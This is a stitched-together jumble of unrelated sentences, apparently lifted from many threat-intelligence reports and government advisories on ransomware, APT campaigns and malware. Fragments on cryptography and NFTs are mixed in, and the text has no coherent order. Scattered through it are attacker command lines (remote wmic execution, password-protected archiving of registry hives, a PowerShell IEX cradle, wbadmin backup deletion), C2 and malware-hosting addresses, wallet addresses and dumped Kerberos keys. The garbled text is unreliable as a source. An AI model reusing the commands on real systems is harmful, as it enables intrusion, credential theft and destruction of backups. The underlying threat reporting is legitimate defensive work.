Figure 7: Functions exported by OfficeTelemetry.dll Upon execution, it locates a packed and compressed payload in the .vdata section (Figure 8) of the memory allocated for the current process. 
Vice Society first surfaced in the summer of 2021, and in that time frame it was seen exploiting the CVE-2021-34527 (aka PrintNightmare) vulnerability as part of their attack chain.
Offensive Tooling EclecticIQ analysts discovered a web server with the IP address 156[.]251[.]172[.]194, which was accessible to the public.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known Hive IOCs and TTPs identified through FBI investigations as recently as November 2022. 
CSC 4 Controlled Use of Admin Privileges CSC 5 Secure Configuration CSC 9 Limitation of Network Ports and Protocols CSC 8 Malware Defenses Endpoint Security Platform 10.7, Threat Prevention, Adaptive Threat Protection, Application Control (MAC), MVISION EDR Persistence Registry Key – Place Value on Run Once Key (T1060) 
Nevertheless, the authors decided to give up the check in the latest version. 
The Trojan needs it in order to maintain persistence. 
We have dubbed it GoBruteforcer, and it targets web servers, specifically those running phpMyAdmin, MySQL, FTP and Postgres services.
If using Windows 10 version 1607 or Windows Server 2016 or later, monitor or disable Windows DefaultAccount, also known as the Default System Managed Account (DSMA). 
CISA recommends selecting one tool to administer the network, ensuring logging is turned on [CPG 3.1], and disabling the others. 
Conveniently, the open source tool Wireshark/Tshark accepts a keyfile to perform this decryption automatically on collected pcap traffic. 
This updated information changed our view on the evidence initially gathered by Unit 42 researchers. 
Hungry for data ModPipe backdoor hits POS software used in hospitality sector
Align your security technologies against the technique. 
The threat actors also expressed interest in other access methods such as RDP, VPN and corporate email credentials.
[System.
Black Basta ransom note.
It is notable that the majority of LAPSUS$ actions exploit the human element as opposed to technical deficiencies or vulnerabilities.
For those who are not familiar with NFTs (Non-fungible token): the term refers to unique tokens that provide proof of ownership on data that is stored on the blockchain technology.
Some of the forwarded exports in the malicious DLL are shown in Figure 7.
In the interest of protecting organizations from malicious actors, we are also publicly disclosing this information and defensive strategies on a more accelerated timeline than a typical vulnerability disclosure.
22 Returns the list of loaded drivers. 
Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”.
Key file dropped for each victim Example CatB ‘key’ file Credential and Browser Data Theft 
Content of the file Notic(20221010)(final).docx It’s interesting to note that the threat actors use date and time strings written in the same format (DD-MM-YYYY) as the extracting passwords in all the cases we’ve collected so far. 
As discussed above, the security of Pedersen hash is guaranteed provided the encoding scheme is injective.
T1057Process
It becomes clear that IronNetInjector is mostly used to load ComRAT.
Despite being written in .NET, it is wrapped by a C++ based dropper and it connects to a set of URLs, which is varying from sample to sample, to download the miner and configuration settings.
Figure 2.
Figure 1 – CMDStealer files with a very low detection rate on Virus Total Operation CMDStealer Attack Vector 
0x10 File size again. 
Cobalt Strike The following Cobalt Strike C2 server was observed: 193.201.9.199:443 JA3:
The original MSI file which initiated the infection drops three files “3CXDesktopApp.exe”, “ffmpeg.dll”, and “d3dcompiler_47.dll”.
Once the malware has de-XOR’d all its strings, it invokes a method named go.
Next, it invokes the “_OUTRECOVERY()” function to steal Outlook data such as server, user, and password from POP3, SMPT, and IMAP registry keys. 
Technical Analysis This campaign lures the victim into believing that they are installing a legitimate application for successful execution.
Secret Scanning[1][2] on source code repositories should be conducted to ensure that sensitive API credentials are not stored in source code.
[T1003.006] for the krbtgt account and several privileged accounts—including domain admins, workstation admins, and a system center configuration management (SCCM) service account (SCCM Account 1).
The malware described in this report are detected and blocked by FortiGuard Antivirus as: W32/EvilExtractor.
To speed up analysis, a write-output cmdlet can be inserted into the function to print the decoded strings to the screen during runtime. 
["010101", "000111"]  
Below is one such instance where malware embeds recompiled Mimikatz code with the minimal required functionality. 
The fact that Get-ADReplAccount command includes not only the current NTLM hashes but also the hash history (i.e., hashes of previous passwords used by a user account) meant that the threat actor also had the ability to discover accounts that either reused the same passwords or used similar passwords when the account password was changed. 
title:
Provide robust anti-phishing training for employees and staff.
/password:<readcted_password> process call create "cmd /c netstat -ano >$temp\a.tmp wmic /node:<redacted_internal_ip2> /user:<redacted_group>\<redacted_user>
D95185A4A3F8512D92F69D2ED7B8743638C54BE8N/AMSIL/Spy.
and writes it to the C:\Windows\System32\config\TxR\<machine hardware profile GUID>.TxR.0.regtrans-ms file. 
Also, the samples we mentioned in the ‘Long-lasting initial infection’ section above were delivered to the victim with a Japanese file name, suggesting the target can read Japanese. 
Once dropped, wlbsctrl.dll becomes loaded on every startup by the IKEEXT service via DLL hijacking.
keyword as a delimiter.
The code that loads the shellcode is shown in Figure 21. Figure 21.
This version is derived by encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64. 
After that, the array is gzip-decompressed and executed.
After execution, the output of commands is uploaded.
It creates symbolic links in the /tmp/ bundle to mirror all directories found in /Applications/Logic Pro X.app/Contents and /Applications/Logic Pro X.app/Contents/MacOS to their respective /tmp/ locations.
Technical DetailsThrough the operation of the National Cybersecurity Protection System (NCPS) and by fulfilling its mission as the national risk advisor, CISA has observed Chinese MSS-affiliated cyber threat actors operating from the People’s Republic of China using commercially available information sources and open-source exploitation tools to target U.S. Government agency networks. 
The second most common vector Royal actors use (in 13.3% of incidents) for initial access is RDP compromise. 
A in ('dir /s /b
Unit 42 has observed the group taking an aggressive approach, threatening not only to publish stolen data to their leak site, but also to send it to the victim’s partners, competitors and the news in an effort to inflict reputational damage. 
Indicators of Compromise SHA1 Description 738d31ceca78ffd053403d3b2bc15847682899a0 Malicious document 9ed39c6a3faab057e6c962f0b2aaab07728c5555 Malicious document af6608755e2708335dc80961a9e634f870aecf3c Malicious document e000596ad65b2427d7af3313e5748c2e7f37fba7 Malicious document fd46411b315beb36926877e4b021721fcd111d7a Malicious document 516db7998e3bf46858352697c1f103ef456f2e8e Crimson RAT 842f55579db786e46b20f7a7053861170e1c0c5e Crimson RAT 87e0ea08713a746d53bef7fb04632bfcd6717fa9 Crimson RAT 911226d78918b303df5110704a8c8bb599bcd403 Crimson RAT 973cb3afc7eb47801ff5d2487d2734ada6b4056f Crimson RAT Domain Description richa-sharma.ddns[.]net C2 server cloud-drive[.]store Malware hosting location drive-phone[.]online Malware hosting location s1.fileditch[.]ch Malware hosting location 
The procedure involves utilizing the instruction itself, and it goes as follows: 
Rootkit After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers. 
Retrieving the address of an API The code snippet in Figure 11 demonstrates how mw_GetExportAddressByHash resolves the given API hash and retrieves the address of an exported function.
By: Don Ovid Ladores April 24, 2023Read time: ( words) Save to Folio Subscribe ViperSoftX, a type of information-stealing software, has been primarily reported as focusing on cryptocurrencies, making headlines in 2022 for its execution technique of hiding malicious code inside log files.
This has been done mostly via LinkedIn in the past. 
We can see that with 30,000+ active installations, the original plugin has only less than 11,000 all time downloads.
192.168.38.102 = SMB Beacon 192.168.38.104 = HTTP Parent Beacon Detecting and Analyzing C2 Traffic Thanks to free, open-source tooling, investigating network traffic has become more accessible.
IRC registering itself in cron.
During our analysis, Talos observed that a malicious server at IP address 185[.]45[.]195[.]226 hosted the PowerShell downloader script and had an open directory that the attacker eventually disabled.
Try to Disable AntiSpyware, Real Time Protection and notification of Windows Defender. 
[D3-RTSD] User Behavior Analysis [D3-UBA] Isolate: Execution Isolation Mandatory Access Control [D3-MAC] Tactics:
The document shows instructions about the use of the Interpretation option available in Zoom. 
SHA1 SHA256ca3ec998_xp.exe34de9725e232ba82275bb0dcf9282e16 b17403e7dcb992ba8d2b56dd843406264d3910e5 aa5a487db37ce176e17c7abbb2b1d460ba926344e46737f2f64b65bf5a4a3e58MD5
;T1552 Unsecured Credentials;To obtain authentication data from the registry and files, the attackers may use NirSoft utilities. 
Reads the Orchestrator configuration and loads installed plugins. 
For ransomware, and NetWalker in particular, the controls must be layered throughout the enterprise.
These attacks are still ongoing at the time of writing and are focused on both government institutions and private companies.
At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.
In this scenario, we’ll apply a similar approach as before, but with a slight twist: we want to avoid publicly uploading our token in plain text. 
Recent operations From late 2021 to mid-2022, this Mint Sandstorm subgroup moved from reconnaissance to direct targeting of US critical infrastructure including seaports, energy companies, transit systems, and a major US utility and gas entity potentially in support of retaliatory destructive cyberattacks.
Figure 9: Decrypted and decompressed payload The loader configuration format is as follows: Field 1: Injection type: Current process (1) or in the new process (2) Field 2: Flag to wait for injection thread to terminate before terminating loader (injection type 1 only) 
" c:\windows\temp\rar.exe a -r c:\windows\temp\873.rar \\<redacted_internal_ip2>\c$\windows\temp\*.hive -hp5tgbnhy67ujm3256 Network infrastructure The main cluster of infrastructure serving the activity of the UEFI implant and ScrambleCross implants is outlined in the table below.
Proofpoint Treasury Sanctions IRGC-Affiliated Cyber Actors for Roles in Ransomware Activity.
='3cx desktop app') 
The results obtained by decoding strings are compared below. 
With Chinese universities (including more than one in Nanjing) being heavily involved in training talent for the Chinese defense industry, it is also plausible that students or other threat actors that are at times associated with APT groups may be carrying out independent threat activity using tools they are familiar with. 
title: AA22-320A: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester url: https://us-cert.cisa.gov/ncas/alerts/aa22-320a Original release date: November 16, 2022 | Last revised: November 25, 2022SummaryFrom mid-June through mid-July 2022, CISA conducted an incident response engagement at a Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced persistent threat (APT) activity.
Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port. 
TA577 – Proofpoint has observed TA577 use IcedID in limited campaigns since February 2021.
The exec call will execute the binary and modify the process name to the mdworker_shared file path.
1BE646816C8543855A96460D437CCF60ED4D31FE电报中文-64.msi (machine translation: Telegram Chinese)Win32/Agent.
software>
The industry-leading CrowdStrike Falcon platform sets the new standard in cybersecurity.
Reflection is used to run the static method Funny.
Winnti continues to pursue game developers and publishers in Russia and elsewhere.
Figure 41.
For example, setting bdaemon to false will prevent the binary from daemonizing (making it easier to debug), while setting bfullog to true to coerce the malware to log its actions! 
It is important to note that while some threat actors use new variants of the IcedID malware, others still choose to deploy the “Standard” variant, with one of the most recent campaigns dating March 10, 2023. 
Figure 35.
This section will focus on what Carbon Black detected and the visibility into the attack process. 
Also, the function within Domino Backdoor to enumerate running processes and send a list of process names and IDs back to the C2 is very similar to the functionality of Lizar’s ListProcesses32/ListProcesses64.dll plugin. 
If the correct password is passed to LEMURLOOT, it sends a header response X-siLock-Comment and value comment, indicating the connection is successful and can accept tasking.
There are a number of theories about the origins of Ransom Cartel.
The decoded command is the following: schtasks /create
Whether this blog is operated by Ransom Cartel or a different group, what is clear is that, while REvil may have disappeared, its malicious influence has not.
In response, Nefilim leaked sensitive Toll Group data and popularized that Toll Group had failed to employ full cybersecurity protocols even after the Netwalker attack, potentially making the organization vulnerable to more attacks.
If remote access solutions are crucial to daily operations, all remote access services and protocols such as Citrix and RDP should be implemented with two-factor or multi-factor authentication.
ComRAT variant 3 • 10profilec.py • 120profilec.py • 220profile.py – • 10profilec.py: .NET injector (variant 2018)
|findstr taskhostProcess discoverytasklist /v
After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved.
After a few months, on the 1st of February, the YouTuber CyberSec Zaado published a video alerting the community about the capabilities of the RAT from a defensive perspective.
As we do with other ransomware groups, Unit 42 strongly advises organizations that have been impacted by Vice Society to avoid paying a ransom if possible, and to instead consult a trusted IR negotiation team for the best course of action. 
This new RAT first showed up on a Twitter account, established in September 2022.
It also deobfuscates and runs another block of code: Figure 8: Third JavaScript layer This fragment of code is responsible for connecting to the C2.
The result is that only small parts of the file—not the entire file—are encrypted.
Process Injection via Hooking Hooking can be used as an injection technique.
Monitor for suspicious behavior and commands.
The first find.bat was used to run AdFind.exe for Active Directory discovery. 
[WINDOWS-SECURITY] Service being stopped by net command v1 5008343 
Group Policy Modification TA0011: Command and Control T1102: Web Service T1102.003: One-Way Communication TA0040: Impact T1485: Data Destruction T1499: Endpoint Denial of Service TA0042: Resource Development T1588: Obtain Capabilities T1588.003: Code Signing Certificates 
In DNS poisoning, threat actors replace the DNS records to redirect unsuspecting users to malicious destinations.
Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. 
In newly created process, it creates a section using genuine file to avoid AVs suspicious scanning.
The decoy files are a Microsoft Word Document and PDF copy of a document titled Proposed MOU GTE Korea.
TA581 – TA581 is a newly classified threat actor Proofpoint has tracked as an unattributed activity cluster since mid-2022.
Figure 1.
Administrative and user accounts should be separated, and designated admin accounts should be exclusively used for admin purposes. 
Check in request data structure The relevant fields in the check-in request are as follows: 1. Size of data package 2. Magic value:
Basic Terminology for Reverse Engineers to Know An executable file can conceal its true code through either encryption or compression.
Note as well that SIMPLESEA, a macOS backdoor found during the 3CX incident response, implements the A5/1 stream cipher. 
[12/May/2023:21:17:36 +0000] "POST /wp-admin/update.php?action=upload-plugin&wc-ajax=1" 200 9567 - 16276 25453 193.169.195.64 -
This involves creating three backup copies on two different file formats, with one of the copies stored in a separate location. 
We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, and event logs including Sysmon under our Security Researcher and Organization services. 
The following analysis was performed on a binary that drops and executes a copy of Apple Logic Pro X (bfa9f7b8014efab4143fb2a77732257144f3b804ee757fb41c9971b715da53d7). 
Later, it will call the getTask function that constructs the following URL url= URL_ENDPOINT .
This can be seen in Figures 20 and 21. Figure 20: Updated Main Shellcode Decryption/Execution Routine Figure 21: Obtain Encrypted Pointer to Encrypted Shellcode from the Resource Section Figure 22:
The actor also abused the msiexe.exe file to silently launch the fetched Windows Installer file. 
As illustrated in the overview, the September 2019 NetWalker version has a different codebase from the ErikNetWalker-linked ransomware variants.
We also observed the context around that batch file in our telemetry.
The shellcode accesses a GitHub repository and brings down icon files which contain encrypted C2 strings that the shellcode then decrypts and communicates to.
North Korean sponsored threat actors have previously been known to create accounts posing as broadcasting scriptwriters to deceive watchers.
The exploitation of Privilege Escalation Adversary used Rotten/Bad Potato to elevate user rights by abusing API calls in the Operating System. 
Our observations of ransom demands by Vice Society across IR cases include: Initial demands by this actor could exceed $1 million. 
The -keepVersions parameter specifies the number of versions to keep, and 0 means all versions except the latest one will be deleted.wbadmin DELETE BACKUP -deleteOldestThis command utilizes wbadmin to delete the oldest regular backup.
The shellcode is stored in the registry, under one of the following keys: HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Classic\<random_number> HKCU\Software\Microsoft\OneDrive\Update\<random_number> HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\HttpsSoftware\Microsoft\Internet Explorer\Zone\<random_number> (two subkeys as one, likely a coding error) 
In fact, while I have been writing this blog, my team observed it download and execute yet another Python script from the cron_script located on the same host.
int __
The model is regularly updated with the latest C2 communication from various types of malware.
IcedID hooks RtlExitUserProcess.
For more information about the product, please visit our official website. 
"fDenyTSConnections" /t
Defense Evasion Technique Title ID Use Valid Accounts: Domain Accounts T1078.002 During Phase II
The latest variant demonstrates that threat actors have adopted more obfuscation techniques, including abusing exception mechanisms to obfuscate the execution flow of programs and Windows API hashing. 
LockBit 2.0 has been observed changing infected computers’ backgrounds to a ransomware note.
For questions or more information on our crimeware reporting service, please contact crimewareintel@kaspersky.com. 
Credential AccessT1552.002Unsecured Credentials: Credentials in RegistryModPipe’s GetMicInfo module retrieves encrypted database passwords for ORACLE MICROS RES 3700 POS software from Windows Registry and uses a custom algorithm to decrypt them before uploading to the C&C. DiscoveryT1057Process DiscoveryModPipe’s ProcList module can get information about processes running on a system. 
Figure 11.
The CV contains plausible contact information, with a St. Petersburg address, email address ending with "@yandex.ru", and phone number starting with "+7" (Russia's country code).
More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy 
The control code that executes a file using ShellExecute. 
6 Anti debugging API Shell execute: Nefilim delete itself from the target systems after infection with the help of ShellExecute API "C:\Windows\System32\cmd.exe" /c
By adjusting the number of encryption threads via the command line argument --thread, it can achieve even faster times. 
APython script that dumps credential hashes. 
This function modifies system files such as cron tab entries and configuration files to further disrupt the system and prevent recovery. 
[T1070.001] Indicator Removal on Host: Clear Command History [1070.003] Indicator Removal on Host: File Deletion
While playing a little bit around, an unexpected attack chain appeared, involving a .zip
As shown in the figure below, Network Deception consists of authentic looking decoy systems placed within the domain network, specifically in the network where the critical assets are placed.
After researching the infrastructure that was utilized, we discovered more than 70 domains used by this group, meaning they were very active until recently.
T1561.001Disk Wipe: Disk Content WipeFantasy wipes all disk contents from non-Windows drives that are fixed drives. 
AnyDesk Remote Desktop Software User-Agent(Snort VRT) MALWARE-OTHER CobaltStrike powershell web delivery attempt Sigma https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/security/win_iso_mount.yml https://github.com/SigmaHQ/sigma/blob/d459483ef6bb889fb8da1baa17a713a4f1aa8897/rules/windows/file_event/file_event_win_iso_file_recent.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_rundll32_not_from_c_drive.yml https://github.com/SigmaHQ/sigma/blob/7f490d958aa7010f7f519e29bed4a45ecebd152e/rules/windows/process_creation/proc_creation_win_susp_powershell_enc_cmd.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_process_dump_rundll32_comsvcs.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_no_params.yml https://github.com/NVISOsecurity/sigma-public/blob/master/rules/windows/sysmon/sysmon_lsass_memdump.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_whoami.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_adfind.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_network_anydesk.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_cobaltstrike_operator_bloopers_cmds.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/adfind_discovery https://github.com/SigmaHQ/sigma/blob/54d141eb585f38fc83a1dc15aa281a84c0416d4f/rules-deprecated/windows/powershell_suspicious_download.yml https://github.com/SigmaHQ/sigma/blob/b24e7ae9846f53cbbf61adad72f17af317c860a4/rules/windows/process_creation/proc_creation_win_susp_powershell_iex_patterns.yml https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/system/win_cobaltstrike_service_installs.yml https://github.com/SigmaHQ/sigma/blob/e10fa684bdd0254b5ba5102feae293b8564f4628/rules/windows/powershell/powershell_script/posh_ps_powerview_malicious_commandlets.yml https://github.com/SigmaHQ/sigma/blob/40adb0339e8e4b5286fc46e05b96e7b48e967e0c/rules/windows/process_creation/proc_creation_win_susp_recon_activity.yml https://github.com/SigmaHQ/sigma/blob/58f1d6fa2c679198f2932e3c361d5fa827effa95/rules/network/zeek/zeek_susp_kerberos_rc4.yml https://github.com/SigmaHQ/sigma/blob/f4ef4fcdc4eb780bcaa59f6756bffa5b0fbacd20/rules/windows/builtin/security/win_susp_rc4_kerberos.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_susp_procdump.yml https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_anydesk.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2022-08-08 Identifier:
The below courses of action mitigate the following techniques: System Network Configuration Discovery [T1016],
However, what we found was different: this intrusion was the work of a well-known Asian APT group implicated in cyberespionage against government targets.
Conclusion Based on the undeniable similarities between this new campaign and the previously reported RapperBot campaign, it is highly likely that they are being operated by a single threat actor or by different threat actors with access to a privately-shared base source code. 
3.1 Unity3D Game Developer from St. Petersburg 
Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service
-w 1 -C IEX ([Net.ServicePointManager]::ServerCertificateValidationCallback={$true}try{[Ref].Assembly.
The attackers used the unique TTP of initiating the loader execution through exe in all cases observed by us.
Shellbag artifacts showing targeting of Chrome directories CrowdStrike identified forensic evidence that showed the entire attack path: browsing to a target user’s Chrome and DPAPI directories via administrative share, installing the Cookie Editor extension, and using Chrome to impersonate the targeted user in the victim’s cloud tenants.
These arent the apps youre looking for fake installers targeting Southeast and East Asia
Metasploit a7df8143a36638de40233b141919d767678b45bf5467e948a637eaafb2820550 be39c3022218ccb3abcfc6c906359b76571f4241 dc758b9ecca41f7f66808258efbfc6cf 283302c43466bdc6524a1e58a0ff9cc223ab8f540a1b0248d1fcffe81b87d5d6 b2bb31ea3b4abaf3f3edbff405e23f2ce442dfe0 3839d37a6a7a29a7af79f102e28b8bc2 b447a7bb633f682058d4b9df5caabbe8c794f087b80bf598d6741a255e925078 3c523a969cc4c273ae27fef32630701516b08873 63584677683b5fbf4f69053a8de9ecbe 01c8cc07a83ffd7ac9ee008685eb360c9934919e86847c50c8843807b9d9c196 37ec3d5be7b535a8a31001815ab275a489e302f5 d92db6b734b1db3874396506613a4962 21dd261e5fe46b86833cd69b299ae5ee5f24da3d4e87de509eddda4d2f63d591 11e86ee44e7c3592c97f7191746e170b62f724bb c8f1aff87d12e0e5c7082b8a565c4abb Payload:
Our analysis of the Windows and Linux malware executables indicates that the malware poses a threat to organizations of all types.
In this blog entry, we discuss findings from our investigation of this ransomware and the tools that Royal ransomware actors used to carry out their attacks. 
Magic marker values replaced during execution within shellcodes in xTalker’s rootkit and MoonBounce In the case of xTalker, the above code elements were found within shellcode intended to be staged through an MBR bootkit.
Table 1 lists the command line arguments accepted by Sandals. 
From a persistence point of view, scheduled tasks [T1053.005] and the use of valid accounts [T1078] acquired through the use of Mimikatz, or creating LSASS dumps, were observed being employed during the length of the campaign. 
The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL’s.
We initially observed this activity on January 6th, and since then the actor has continued to standardize it in their infection scripts today.
During Phase II, they used compromised workstation and domain admin accounts to upload a payload via SMB on several target Workstations and the DC. 
The scripts will then rebuild mining operations and begin using two known WatchDog Monero wallet addresses, 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4 and 87q6aU1M9xmQ5p3wh8Jzst5mcFfDzKEuuDjV6u7Q7UDnAXJR7FLeQH2UYFzhQatde2WHuZ9LbxRsf3PGA8gpnGXL3G7iWMv.
Figure 15 – Execution of FRP reverse SOCKS proxy on infected host. 
Aside from the logging connection to host 3, all other connections are forced through Host 1. 
[D3-EAL] Indicator Removal from Host [T1070] Chinese state-sponsored cyber actors have been observed deleting files using rm or del commands. 
On July 19, 2021, the U.S. Department of Justice (DOJ) unsealed an indictment against four APT40 cyber actors for their illicit computer network exploitation (CNE) activities via front company Hainan Xiandun Technology Development Company (Hainan Xiandun).
Only allow authorized administrators to make service changes and modify service configurations. 
Relations of the archive file Figure 47.
C:\ProgramData\lmapi2.dll,#1 The DLL file lmapi2.dll is a 64-bit PE file with the compiler timestamp Mon Jan 17 08:10:01 2022 | UTC.
Now, let’s move on to the detailed dynamic analysis stage, verify what we found in the “static analysis” section, and check if we can change the request to the C2 address. 
DataThe attackers have used various RATs that can access and modify data from the clipboard. T1005Data from Local SystemThe attackers have used various RATs that can access the local file system and upload, download or delete files. 
The following picture shows the high-level overview of the various IcedID variants Proofpoint researchers have identified. 
Finally, it decrypts the configuration file: Figure 11.
"w.bat" as viewed through a text editor.
FGLT!tr W64/Havoc.
The operating system logs contain timestamps for shutdown and power on.
These work in tandem to insert data into the Windows Registry and execute PowerShell commands. 
Arkime is a tool that we use a lot to investigate network activity and gather indicators.
Now that we have a better understanding of the Pedersen hash and its security, let’s look at some of the attacks that apply if one were to overlook some of the requirements described so far.\n
There have been multiple versions of this threat.
Key (16 bytes) Encrypted configuration The configuration, in turn, contains the following fields: 0x0 heartbeat interval (in seconds) 0x4 reconnect interval (in seconds) 0x8 bitmask for days of the week when connections may be made 0xC (inclusive) lower bound for time of day when connections may be made 0x10 (non-inclusive) upper bound for time of day when connections may be made 0x14 proxy port 0x18
However, generally speaking, the keys to preventing DNS attacks include keeping the DNC server software up to date, using a dedicated DNS server to provide the DNS service, increasing the number of recursive DNS servers, and checking for vulnerabilities to mitigate DDoS attacks. 
This way the malware tries to remove itself from the machine to avoid being detected and analyzed by security researchers: Figure 17.
Threat analytics report on the Solorigate attack Advanced hunting Microsoft 365 Defender and Microsoft Defender for Endpoint customers can run advanced hunting queries to hunt for similar TTPs used in this attack. 
Utilizing I2P, the dropper then downloads a custom XMRig miner and orchestrates the mining operations. 
In the initial stage of the execution, the script decodes the base64-encoded strings and initializes them.
The adversary uses Cobalt Strike as framework to manage their compromised systems.
[TA0004] Technique Title ID Use Scheduled Task/Job: Scheduled
Customers are informed of the observed activity and actions taken by the team every step of the way. 
4096 AES128_CTS_HMAC_SHA1_96 Key: c38dfbd6c00b5f3b010a07f9e824fc38 Iterations: 4096 DES_CBC_MD5 Key: 000039a500000551 Iterations: 4096 DES_CBC_CRC Key: 000039a500000551 Iterations: 4096 ServiceCredentials: Salt:
The .jpg file is leveraged to overwrite the desktop background and appears as follows: Figure 2.
Dropped Files 
The first .CMD file set seen to use AutoIt in its execution was discovered at the end of 2021.
In this blog, we will explain how attackers used an innocent-looking email to lure victims into opening an attachment.
The 56-byte value is SHA1 hashed again and the first 16-bytes form the initialization vector (IV), while the key is the 16-byte MachineGUID value from the host’s registry.
Service Manipulates (creates, lists, starts, stops and deletes) services. 
The victims are primarily in Portugal, Mexico, and Peru.
Place a value on RunOnce key Modify Registry key (T1112): Create its own registry key in \SOFTWARE\<uniquename> Privilege Escalation Exploitation for Privilege Escalation (T1068): CVE-2020-0796, CVE-2019-1458, CVE-2017-0213, CVE-2015-1701 Process Injection (T1055.001): Reflective DLL Injection Defense Evasion Disabling Security Tools (T1562.001): ESET AV Remover, Trend Micro’s Security Agent Uninstall Tool, Microsoft Security Client Uninstall Process Injection (T1055.001): Reflective DLL Injection Deobfuscate/Decode Files or Information (T1140) Obfuscated Files or Information (T1027): PowerShell Script uses Base64 and hexadecimal encoding and XOR-encryption Credential Access Credential Dumping (T1003): Mimikatz, Mimidogz, Mimikittenz, Windows Credentials Editor, Pwdump, LaZagne Brute Force (T1110.001): NLBrute Discovery Network Service Scanning (T1046): SoftPerfect Network Scanner Security Software Discovery (T1518.001) 
The injection process is similar to Phantom DLL hollowing and is described as follows: Open a transacted handle to a copied file via the API CreateFileTransactedA() 
[15]• CVE-2021-44228 Apache Log4j
If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further commands and sends information about the infected machine. 
The lure document is a PowerPoint file that exploits a code execution technique, which is designed to be triggered when the user starts the presentation mode and moves the mouse.
Updated Oct. 15, 2002, at 11:15 a.m.
But in this case, the ransomware destroys these logs twice.
If the hashes are equal, execution proceeds past the download loop — otherwise, the outer download loop is reevaluated. 
Carbon Black is able to quickly detect TrueBot and its associated activity and, with the help of MDR, be able to detect and contain it early in the attack chain before the threat escalates. 
They emerged in mid-2021 and have been observed launching big-game hunting and double-extortion attacks, primarily targeting small or midsize victims.
TA0008 Lateral Movement T1021.001.
The victim double clicks the ISO to mount it (1).
Government agencies, academia, and tourism were some of the targeted sectors. 
Detection:
Impact NCC Group has observed disruption and destruction to client environments by LAPSUS$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities. 
ariopolanetyoa[.]com ProjectID: 3278418257 Standard IcedID Bot Configuration: C2:
Implement temporary solutions using an account with administrative privileges.
The other entries are used to identify the backdoor and the victimized host: 
In the last 12 months, CISA has observed Chinese MSS-affiliated actors use spearphishing emails with embedded links to actor-owned infrastructure and, in some cases, compromise or poison legitimate sites to enable cyber operations. 
In some emails, people and entities in academia are also targeted, also related to nuclear energy.
The above image shows an example of Garmin’s ElevatedInstaller.exe being abused to side-load the malicious DLL.
13524222881554126454-128.pngFigure 34.
The leaked FinFisher support questions database suggests physical access could be used to infect machines: 
The POST event included a MIME part indicating file upload activity 
Fragment of shellcode from 3t54dE3r.tmpThe network infrastructure of the samples overlaps with previously known APT41 infrastructure: at the IP address of one of the C2 servers, we find an SSL certificate with SHA-1 value of b8cff709950cfa86665363d9553532db9922265c, which is also found at IP address 67.229.97[.]229, referenced in a 2018 CrowdStrike report.
[T1070]. 
All unnecessary services and ports should be disabled or blocked.
This payload has been built using the Github project Costura, which allows SeroXen to pack the code’s dependencies into the .NET assembly so it can run self-contained. 
Yes -d <path>
As shown in Figure 9, this short snippet is packed full of anti-analysis tricks, but ultimately amounts to an unconditional 16-byte jump.
T1588.003Obtain Capabilities: Code Signing CertificatesTA410 uses stolen code-signing certificates. 
We have not confirmed if either of these anomalies directly led to the crash above.
Black Basta desktop wallpaper.
This technique makes it harder to dump the plaintext values from the process’s memory and to analyze exit dumps.
FORCE_TASK; and issues a GET request to the C2 with information identifying the victim.
However, as evidenced in this recent campaign, their focus has shifted to high-level government officials from G20 countries in Europe, North America, and South Asia.
REG_DWORD /d
